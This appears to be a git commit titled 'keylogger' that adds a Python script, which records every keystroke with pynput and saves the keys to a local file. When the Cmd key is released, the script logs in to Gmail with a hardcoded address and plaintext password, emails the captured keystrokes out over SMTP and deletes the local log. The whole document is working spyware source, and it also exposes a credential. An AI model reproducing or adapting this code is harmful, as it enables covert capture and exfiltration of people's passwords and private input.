4cc037d26559dade00c21782eb29a3c75e80e82d
HuckApps <jakehunt000000@gmail.com>
2019-12-02 20:45:14 -0800

    keylogger

---
+++ ad_keylogger.py
@@ -0,0 +1,61 @@
+from pynput.keyboard import Listener, Key
+import os
+import smtplib, ssl
+
+
+keys = []
+count = 0
+
+
+def on_press(Key):
+    global count, keys
+    keys.append(Key)
+    count += 1
+    if count >= 5:
+        count = 0
+        write_files(keys)
+        keys = []
+
+
+def write_files(keys):
+    with open('keys.txt', 'a') as fs:
+        fs.write('five keys[')
+        for i in keys:
+            key = str(i).lstrip('Key.').rstrip('.key')
+            fs.write(f' {key} ')
+        fs.write(']')
+
+
+def on_release(Key):
+    if Key == Key.esc:
+        return False
+    elif Key == Key.cmd and len(keys) != 0:
+        with open('keys.txt', 'r') as fs:
+            log = fs.read()
+            email= 'jakehunt000000@gmail.com'
+            password= 'pussypie'
+            port=465
+            context= ssl.create_default_context()
+            try:
+                with smtplib.SMTP_SSL('smtp.gmail.com',port, context=context) as server:
+                    print('here now')
+                    server.login(email,password)
+                    server.sendmail(email,email, log)
+                    if os.path.exists('keys.txt'):
+                         os.remove('keys.txt')
+                    else:
+                        return
+            except Exception as e:
+                return
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+
+
+
+
+
